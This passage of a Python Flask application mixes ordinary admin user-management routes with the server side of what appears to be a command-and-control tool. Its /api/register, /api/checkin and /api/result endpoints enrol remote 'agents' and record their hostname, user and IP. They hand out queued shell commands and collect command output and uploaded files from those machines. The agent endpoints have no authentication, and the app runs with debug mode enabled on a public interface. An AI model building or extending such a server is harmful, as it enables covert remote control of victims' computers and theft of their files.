        try:
            c = conn.cursor()
            existing = c.execute("SELECT id FROM users WHERE username = ?", (form.username.data,)).fetchone()
            if existing:
                flash('Username already exists', 'danger')
            else:
                c.execute("INSERT INTO users (username, password_hash, is_admin) VALUES (?, ?, ?)",
                         (form.username.data, generate_password_hash(form.password.data), form.is_admin.data))
                conn.commit()
                flash('User created successfully', 'success')
                return redirect(url_for('users_view'))
        finally:
            db_pool.return_connection(conn)
    
    return render_template('user_form.html', form=form, action='Add')

@app.route('/users/edit/<int:user_id>', methods=['GET', 'POST'])
@login_required
def edit_user(user_id):
    if not current_user.is_admin:
        flash('Admin privileges required', 'danger')
        return redirect(url_for('dashboard'))
    
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        user = c.execute("SELECT id, username, is_admin FROM users WHERE id = ?", (user_id,)).fetchone()
        
        if not user:
            flash('User not found', 'danger')
            return redirect(url_for('users_view'))
        
        form = UserForm()
        
        if form.validate_on_submit():
            if form.password.data:
                c.execute("UPDATE users SET password_hash = ?, is_admin = ? WHERE id = ?",
                         (generate_password_hash(form.password.data), form.is_admin.data, user_id))
            else:
                c.execute("UPDATE users SET is_admin = ? WHERE id = ?",
                         (form.is_admin.data, user_id))
            conn.commit()
            flash('User updated successfully', 'success')
            return redirect(url_for('users_view'))
        
        # Set current values in form
        form.username.data = user['username']
        form.is_admin.data = bool(user['is_admin'])
        form.password.validators = [Optional(), Length(min=6)]  # Make password optional for edits
        
        return render_template('user_form.html', form=form, action='Edit')
    finally:
        db_pool.return_connection(conn)

@app.route('/users/delete/<int:user_id>', methods=['POST'])
@login_required
def delete_user(user_id):
    if not current_user.is_admin:
        flash('Admin privileges required', 'danger')
        return redirect(url_for('dashboard'))
    
    if current_user.id == user_id:
        flash('You cannot delete your own account', 'danger')
        return redirect(url_for('users_view'))
    
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        c.execute("DELETE FROM users WHERE id = ?", (user_id,))
        conn.commit()
        flash('User deleted successfully', 'success')
    finally:
        db_pool.return_connection(conn)
    
    return redirect(url_for('users_view'))

@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    agent_id = str(uuid.uuid4())
    ip = request.remote_addr
    info = data.get('info', {})
    
    hostname = info.get('hostname', '')
    os_info = info.get('os', '')
    username = info.get('username', '')
    
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        c.execute("""INSERT INTO agents 
                     (id, hostname, os, username, ip, info, last_seen, active, created_at)
                     VALUES (?, ?, ?, ?, ?, ?, ?, 1, ?)""",
                  (agent_id, hostname, os_info, username, ip, json.dumps(info), time.time(), time.time()))
        conn.commit()
    finally:
        db_pool.return_connection(conn)
    
    active_agents.add(agent_id)
    app.logger.info(f"Agent registered: {agent_id} from {ip}")
    return jsonify({'agent_id': agent_id})

@app.route('/api/checkin/<agent_id>', methods=['GET'])
def checkin(agent_id):
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        c.execute("UPDATE agents SET last_seen = ?, active = 1 WHERE id = ?", 
                  (time.time(), agent_id))
        
        command = c.execute("""SELECT id, command, is_file, file_path 
                              FROM commands 
                              WHERE agent_id = ? 
                              ORDER BY id ASC LIMIT 1""", 
                           (agent_id,)).fetchone()
        
        if command:
            c.execute("DELETE FROM commands WHERE id = ?", (command['id'],))
            conn.commit()
            
            if command['is_file']:
                response = {
                    'command': command['command'],
                    'is_file': True,
                    'file_path': command['file_path']
                }
            else:
                response = {
                    'command': command['command'],
                    'is_file': False
                }
        else:
            response = {'command': ''}
            
        conn.commit()
    finally:
        db_pool.return_connection(conn)
    
    if agent_id not in active_agents:
        active_agents.add(agent_id)
    
    return jsonify(response)

@app.route('/api/result/<agent_id>', methods=['POST'])
def result(agent_id):
    output = request.json.get('output', '')
    is_file = request.json.get('is_file', False)
    command_id = request.json.get('command_id', None)
    file = request.files.get('file') if is_file else None
    timestamp = time.time()
    
    file_path = None
    if is_file and file:
        filename = secure_filename(file.filename)
        file_path = os.path.join(app.config['DOWNLOAD_FOLDER'], f"{agent_id}_{int(time.time())}_{filename}")
        file.save(file_path)
        record_downloaded_file(agent_id, filename, file_path)
    
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        c.execute("""INSERT INTO results 
                    (agent_id, command_id, output, timestamp, is_file, file_path)
                    VALUES (?, ?, ?, ?, ?, ?)""",
                 (agent_id, command_id, output, timestamp, 1 if is_file else 0, file_path))
        conn.commit()
    finally:
        db_pool.return_connection(conn)
    
    result_cache.append({
        'agent_id': agent_id,
        'output': output,
        'timestamp': timestamp,
        'is_file': is_file,
        'file_path': file_path
    })
    
    app.logger.info(f"Result from {agent_id}: {output[:50]}...")
    return jsonify({'status': 'received'})

def cleanup():
    app.logger.info("Cleaning up before exit...")
    schedule.clear()
    while db_pool.pool:
        conn = db_pool.pool.pop()
        conn.close()

atexit.register(cleanup)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, debug=True ,
           ssl_context=(' Example_BEGIN_CERTIFICATE.pem', 'Example_private_key.pem'), 
           threaded=True)

